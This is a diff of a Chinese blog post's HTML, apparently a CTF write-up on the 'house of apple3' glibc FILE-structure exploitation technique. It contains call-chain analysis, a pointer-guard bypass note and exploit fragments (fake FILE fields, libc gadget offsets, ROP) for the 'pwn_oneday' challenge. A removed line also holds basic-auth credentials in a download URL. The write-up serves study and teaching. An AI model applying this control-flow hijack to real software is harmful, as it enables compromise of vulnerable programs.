@@ -121,7 +121,7 @@ house of apple3
               ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item">
               <a
                 class="menu-link"
-                href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                href="https://download.roderickchan.cn/"
                 title="我的资源下载中心"
                 rel="noopener noreferrer" target="_blank"
               ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
@@ -208,7 +208,7 @@ house of apple3
               class="menu-item"
             ><a
                   class="menu-link"
-                  href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                  href="https://download.roderickchan.cn/"
                   title="我的资源下载中心"
                   rel="noopener noreferrer" target="_blank"
                 ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li
@@ -303,7 +303,7 @@ house of apple3
 <p>因此，如果能伪造整个<code>FILE</code>结构体，则需要设置合适的<code>_wide_data</code>；如果只能伪部分<code>FILE</code>的成员的话，保持<code>fp-&gt;_wide_data</code>为默认地址即可。</p>
 <h2 id="利用原理">利用原理</h2>
 <p><code>FILE</code>结构体中有一个成员<code>struct _IO_codecvt *_codecvt;</code>，偏移为<code>0x98</code>。该结构体参与宽字符的转换工作，结构体被定义为：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-1"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -318,11 +318,10 @@ house of apple3
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="n">_IO_iconv_t</span> <span class="n">__cd_in</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="n">_IO_iconv_t</span> <span class="n">__cd_out</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">};</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>可以看到，<code>__cd_in</code>和<code>__cd_out</code>是同一种类型的数据。往下拆，结构体<code>_IO_iconv_t</code>被定义为：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-2"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -337,11 +336,10 @@ house of apple3
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">__gconv_step</span> <span class="o">*</span><span class="n">step</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">__gconv_step_data</span> <span class="n">step_data</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">_IO_iconv_t</span><span class="p">;</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">_IO_iconv_t</span><span class="p">;</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>继续拆，来看<code>struct __gconv_step</code>：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-3"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -406,11 +404,10 @@ house of apple3
 </span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">__stateful</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">__data</span><span class="p">;</span>		<span class="cm">/* Pointer to step-local data.  */</span>
-</span></span><span class="line"><span class="cl"><span class="p">};</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>然后来看<code>struct __gconv_step_data</code>结构体：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-4"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -459,12 +456,11 @@ house of apple3
 </span></span><span class="line"><span class="cl">  <span class="n">__mbstate_t</span> <span class="o">*</span><span class="n">__statep</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="n">__mbstate_t</span> <span class="n">__state</span><span class="p">;</span>	<span class="cm">/* This element must not be used directly by
 </span></span></span><span class="line"><span class="cl"><span class="cm">			   any module; always use STATEP!  */</span>
-</span></span><span class="line"><span class="cl"><span class="p">};</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>以上两个结构体均会被用于字符转换，而在利用的过程中，需要精准控制结构体中的某些成员，避免引发内存访问错误。</p>
 <p><code>house of apple3</code>的利用主要关注以下三个函数：<code>__libio_codecvt_out</code>、<code>__libio_codecvt_in</code>和<code>__libio_codecvt_length</code>。三个函数的利用点都差不多，以<code>__libio_codecvt_in</code>为例，源码分析如下：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-5"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -531,11 +527,10 @@ house of apple3
 </span></span><span class="line"><span class="cl">			 <span class="p">(</span><span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">from_end</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">			 <span class="o">&amp;</span><span class="n">dummy</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">       <span class="c1">// ......
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>其中，<code>__gconv_fct</code>和<code>DL_CALL_FCT</code>被定义为：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-6"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -554,11 +549,10 @@ house of apple3
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="cp">#ifndef DL_CALL_FCT
 </span></span></span><span class="line"><span class="cl"><span class="cp"># define DL_CALL_FCT(fct, args) fct args
-</span></span></span><span class="line"><span class="cl"><span class="cp">#endif
-</span></span></span></code></pre></td></tr></table>
+</span></span></span><span class="line"><span class="cl"><span class="cp">#endif</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>而在<code>_IO_wfile_underflow</code>函数中调用了<code>__libio_codecvt_in</code>，代码片段如下：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-7"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -651,14 +645,13 @@ house of apple3
 </span></span><span class="line"><span class="cl">				   <span class="o">&amp;</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">           <span class="c1">// ......
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>而<code>_IO_wfile_underflow</code>又是<code>_IO_wfile_jumps</code>这个<code>_IO_jump_t</code>类型变量的成员函数。</p>
 <p>分析到这里，利用原理就呼之欲出了：劫持或者伪造<code>FILE</code>结构体的<code>fp-&gt;vtable</code>为<code>_IO_wfile_jumps</code>，<code>fp-&gt;_codecvt</code>为可控堆地址，当程序执行<code>IO</code>操作时，控制程序执行流走到<code>_IO_wfile_underflow</code>，设置好<code>fp-&gt;codecvt-&gt;__cd_in</code>结构体，使得最终调用到<code>__libio_codecvt_in</code>中的<code>DL_CALL_FCT</code>宏，伪造函数指针，进而控制程序执行流。</p>
 <p>注意，在伪造过程中，可以设置<code>gs-&gt;__shlib_handle == NULL</code>，从而绕过<code>__pointer_guard</code>的指针调用保护。</p>
 <p>基于该利用思路，编写<code>demo</code>验证：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-8"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -773,11 +766,10 @@ house of apple3
 </span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] step 7: call fflush(stderr) to trigger backdoor func&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stderr</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>输出如下：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-9"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -806,8 +798,7 @@ house of apple3
 </span></span><span class="line"><span class="cl">[+] step 5: set stderr-&gt;codecvt-&gt;__cd_in.step with the allocated chunk p2
 </span></span><span class="line"><span class="cl">[+] step 6: put backdoor at stderr-&gt;codecvt-&gt;__cd_in.step-&gt;__fct
 </span></span><span class="line"><span class="cl">[+] step 7: call fflush(stderr) to trigger backdoor func
-</span></span><span class="line"><span class="cl">[!] Backdoor is called!
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">[!] Backdoor is called!</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/956675_BY2KFGWNZQYDH2S.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/956675_BY2KFGWNZQYDH2S.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/956675_BY2KFGWNZQYDH2S.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/956675_BY2KFGWNZQYDH2S.png 2x" sizes="auto" data-title="img" data-alt="img" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h2 id="利用思路">利用思路</h2>
@@ -826,7 +817,7 @@ house of apple3
 <li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li>
 </ul>
 <p>函数的调用链如下：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-10"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -839,8 +830,7 @@ house of apple3
 </span></span><span class="line"><span class="cl">    __libio_codecvt_in
 </span></span><span class="line"><span class="cl">        DL_CALL_FCT
 </span></span><span class="line"><span class="cl">            gs = fp-&gt;_codecvt-&gt;__cd_in.step
-</span></span><span class="line"><span class="cl">            *(gs-&gt;__fct)(gs)
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">            *(gs-&gt;__fct)(gs)</span></span></code></pre></td></tr></table>
 </div>
 </div><p>此链的详细分析见上述的利用原理部分。</p>
 <h3 id="利用_io_wfile_underflow_mmap函数控制程序执行流">利用_IO_wfile_underflow_mmap函数控制程序执行流</h3>
@@ -858,7 +848,7 @@ house of apple3
 <li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li>
 </ul>
 <p>函数的调用链如下：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-11"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -871,12 +861,11 @@ house of apple3
 </span></span><span class="line"><span class="cl">    __libio_codecvt_in
 </span></span><span class="line"><span class="cl">        DL_CALL_FCT
 </span></span><span class="line"><span class="cl">            gs = fp-&gt;_codecvt-&gt;__cd_in.step
-</span></span><span class="line"><span class="cl">            *(gs-&gt;__fct)(gs)
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">            *(gs-&gt;__fct)(gs)</span></span></code></pre></td></tr></table>
 </div>
 </div><p>详细分析如下：
 看<code>_IO_wfile_underflow_mmap</code>函数：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-12"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -987,13 +976,12 @@ house of apple3
 </span></span><span class="line"><span class="cl">		      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">		      <span class="o">&amp;</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">//......
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base != NULL</code>不进入调用。</p>
 <h3 id="利用_io_wdo_write函数控制程序执行流">利用_IO_wdo_write函数控制程序执行流</h3>
 <p><code>_IO_wdo_write</code>的调用点很多，这里我选择一个相对简单的链：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-13"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1002,8 +990,7 @@ house of apple3
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">_IO_new_file_sync
 </span></span><span class="line"><span class="cl">    _IO_do_flush
-</span></span><span class="line"><span class="cl">      _IO_wdo_write
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">      _IO_wdo_write</span></span></code></pre></td></tr></table>
 </div>
 </div><p>对<code>fp</code>的设置如下：</p>
 <ul>
@@ -1019,7 +1006,7 @@ house of apple3
 <li><code>codecvt-&gt;__cd_out.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li>
 </ul>
 <p>函数的调用链如下：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-14"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1036,12 +1023,11 @@ house of apple3
 </span></span><span class="line"><span class="cl">          __libio_codecvt_out
 </span></span><span class="line"><span class="cl">              DL_CALL_FCT
 </span></span><span class="line"><span class="cl">                  gs = fp-&gt;_codecvt-&gt;__cd_out.step
-</span></span><span class="line"><span class="cl">                  *(gs-&gt;__fct)(gs)
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">                  *(gs-&gt;__fct)(gs)</span></span></code></pre></td></tr></table>
 </div>
 </div><p>详细分析如下：
 首先看<code>_IO_new_file_sync</code>函数：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-15"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1066,12 +1052,11 @@ house of apple3
 </span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">_IO_do_flush</span><span class="p">(</span><span class="n">fp</span><span class="p">))</span> <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span><span class="c1">//调用到这里
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//......
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>只需要满足<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>。</p>
 <p>然后看<code>_IO_do_flush</code>宏：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-16"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1088,12 +1073,11 @@ house of apple3
 </span></span></span><span class="line"><span class="cl"><span class="cp">		  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)		      \
 </span></span></span><span class="line"><span class="cl"><span class="cp">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,		      \
 </span></span></span><span class="line"><span class="cl"><span class="cp">		   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr			      \
-</span></span></span><span class="line"><span class="cl"><span class="cp">		    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))
-</span></span></span></code></pre></td></tr></table>
+</span></span></span><span class="line"><span class="cl"><span class="cp">		    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>根据<code>fp-&gt;_mode</code>的值选择调用<code>_IO_do_write</code>或者<code>_IO_wdo_write</code>。这里我们要调用后者，必须使<code>fp-&gt;_mode &gt; 0</code>。此时的第二个参数为<code>fp-&gt;_wide_data-&gt;_IO_write_base</code>，第三个参数为<code>fp-&gt;_wide_data-&gt;_IO_write_ptr - fp-&gt;_wide_data-&gt;_IO_write_base</code>。</p>
 <p>接着看<code>_IO_wdo_write</code>：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-17"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1152,8 +1136,7 @@ house of apple3
 </span></span><span class="line"><span class="cl">					<span class="o">&amp;</span><span class="n">write_ptr</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">          <span class="c1">//......
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>首先<code>to_do</code>必须要大于<code>0</code>，即满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>，然后这个判断需要为假<code>fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base</code>。</p>
 <p>这个链基本需要控制<code>fp-&gt;_wide_data</code>，相比上两条链的约束条件要更多一点。</p>
@@ -1172,7 +1155,7 @@ house of apple3
 <li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>rsi</code>为<code>&amp;codecvt-&gt;__cd_in.step_data</code>可控。</li>
 </ul>
 <p>函数的调用链如下：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-18"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1185,12 +1168,11 @@ house of apple3
 </span></span><span class="line"><span class="cl">    __libio_codecvt_length
 </span></span><span class="line"><span class="cl">        DL_CALL_FCT
 </span></span><span class="line"><span class="cl">            gs = fp-&gt;_codecvt-&gt;__cd_in.step
-</span></span><span class="line"><span class="cl">            *(gs-&gt;__fct)(gs)
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">            *(gs-&gt;__fct)(gs)</span></span></code></pre></td></tr></table>
 </div>
 </div><p>详细分析如下：
 直接看<code>_IO_wfile_sync</code>函数：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-19"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1285,12 +1267,11 @@ house of apple3
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>需要设置<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &lt;= fp-&gt;_wide_data-&gt;_IO_write_base</code>和<code>fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end != 0</code>。</p>
 <p>然后看下<code>__libio_codecvt_encoding</code>函数：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-20"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1323,15 +1304,14 @@ house of apple3
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">codecvt</span><span class="o">-&gt;</span><span class="n">__cd_in</span><span class="p">.</span><span class="n">step</span><span class="o">-&gt;</span><span class="n">__min_needed_from</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>直接设置<code>fp-&gt;codecvt-&gt;__cd_in.step-&gt;__stateful != 0</code>即可返回<code>-1</code>。</p>
 <h2 id="例题分析">例题分析</h2>
 <p>依旧以 <a href="https://bbs.pediy.com/thread-273418.htm"target="_blank" rel="external nofollow noopener noreferrer">house of apple1<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a> 中的<code>pwn_oneday</code>为例。</p>
 <p>程序的详细分析仍然不在此赘述。这里展示使用<code>_IO_wfile_underflow</code>这条链做<code>rop</code>，然后使用<code>orw</code>读取<code>flag</code>。</p>
 <p>在<code>largebin attack</code>攻击<code>_IO_list_all</code>之后，伪造<code>_IO_FILE</code>结构：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-21"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1362,11 +1342,10 @@ house of apple3
 </span></span><span class="line"><span class="cl"><span class="n">f1</span><span class="o">.</span><span class="n">_lock</span> <span class="o">=</span> <span class="n">_lock</span>
 </span></span><span class="line"><span class="cl"><span class="n">f1</span><span class="o">.</span><span class="n">_wide_data</span> <span class="o">=</span> <span class="n">_IO_wide_data_2</span> <span class="c1"># 设置为默认</span>
 </span></span><span class="line"><span class="cl"><span class="n">f1</span><span class="o">.</span><span class="n">_codecvt</span> <span class="o">=</span> <span class="n">fake_IO_FILE</span> <span class="o">+</span> <span class="mh">0xe0</span>
-</span></span><span class="line"><span class="cl"><span class="n">f1</span><span class="o">.</span><span class="n">vtable</span> <span class="o">=</span> <span class="n">_IO_wfile_jumps</span> <span class="o">+</span> <span class="mi">8</span> <span class="c1"># call _IO_wfile_underflow</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">f1</span><span class="o">.</span><span class="n">vtable</span> <span class="o">=</span> <span class="n">_IO_wfile_jumps</span> <span class="o">+</span> <span class="mi">8</span> <span class="c1"># call _IO_wfile_underflow</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>然后借助几个<code>gadgets</code>中转一下：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-22"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1389,11 +1368,10 @@ house of apple3
 </span></span><span class="line"><span class="cl"><span class="cp"># 0x146020: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">mov_rdx_from_rdi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x146020</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">add_rsp_0x20_pop_rbx_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xfd449</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">add_rsp_0x20_pop_rbx_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xfd449</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>所以最后的<code>exp</code>为：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-23"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
@@ -1702,8 +1680,7 @@ house of apple3
 </span></span><span class="line"><span class="cl"> 
 </span></span><span class="line"><span class="cl"><span class="n">bye</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>调试如下：
 通过<code>exit</code>执行到<code>_IO_wfile_underflow</code>，然后执行到<code>__libio_codecvt_in</code>：
